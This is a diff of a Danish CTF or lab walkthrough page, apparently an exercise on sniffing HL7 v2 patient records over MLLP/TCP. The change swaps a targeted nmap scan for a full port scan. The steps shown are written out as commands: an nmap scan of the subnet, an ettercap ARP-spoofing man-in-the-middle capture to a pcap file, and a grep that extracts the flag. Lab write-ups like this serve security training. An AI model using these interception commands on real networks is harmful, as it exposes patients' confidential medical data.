@@ -30,11 +30,14 @@
 <div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik. Læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a> · <a href="arp-mitm.html">Primer: ARP-spoofing &amp; MITM</a>.</div>
 <h2>Hvad går opgaven ud på?</h2>
 <p>Et hospital sender journaler med "et meget normalt protokol" = <strong>HL7 v2</strong>, pakket i
-             <strong>MLLP over TCP (port 2575)</strong>. HL7 er klartekst-segmenter adskilt af <code>|</code> og
+             <strong>MLLP over TCP</strong>. HL7 er klartekst-segmenter adskilt af <code>|</code> og
              <code>^</code> (<code>MSH</code>, <code>PID</code>, <code>OBR</code>, <code>OBX</code> …), så en MITM kan
              læse hele journalen.</p>
 <h2>Trin for trin</h2>
-<pre><code>sudo <span class="gloss" tabindex="0" data-tip="Netværksscanner: finder åbne porte og services på en host.">nmap</span> -Pn -p2575 --open &lt;subnet&gt;/24      # find HL7-serveren
+<p>Scan subnettet bredt i stedet for at antage porten. Én host svarer på port 2575,
+             HL7/MLLP's standardport:</p>
+             <pre><code>sudo <span class="gloss" tabindex="0" data-tip="Netværksscanner: finder åbne porte og services på en host.">nmap</span> -Pn -p- --open &lt;subnet&gt;/24          # fuld portscan af subnettet
+# &lt;server&gt;  2575/tcp open   (MLLP/HL7)
 sudo <span class="gloss" tabindex="0" data-tip="ARP-spoofing/MITM-værktøj til at opsnappe trafik på et lokalt netværk.">ettercap</span> -T -q -i eth0 -M arp:remote -w /tmp/hl7.pcap /&lt;server&gt;// ///
 # tekst-protokol -> ofte nok:
 strings /tmp/hl7.pcap | grep -aoiE '(HKN|DDC)\{[^}]*\}'</code></pre>
